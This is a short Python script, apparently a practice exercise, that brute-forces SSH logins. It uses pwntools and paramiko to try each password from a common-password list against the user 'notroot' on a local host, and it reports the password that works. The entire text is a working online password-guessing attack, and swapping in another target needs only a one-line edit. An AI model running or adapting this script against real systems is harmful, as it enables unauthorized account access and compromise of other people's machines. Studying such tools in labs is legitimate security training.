from pwn import *
import paramiko

# Variable declaring IP of target
host = "127.0.0.1"

# Variable declaring targer username
username = "notroot"

# Variable to keep track of number of attempts 
attempts = 0 

# Open password list file as variable password_list
with open("ssh-common-password.txt", "r") as password_list:
# iterate over password in password list file
    for password in password_list: 
        password = password.strip("\n")
        try:
            # Attempt ssh connections with iterations 
            print("[{}] Attempting password: '{}'!".format(attempts, password))
            response = ssh(host=host, user=username, password=password, timeout=1)
            if response.connected():
                print("[>] Valid password found: '{}'!".format(password))
                response.close()
                break
            response.close()
        # Handle exception for invalid passwords
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password!")
        attempts += 1 
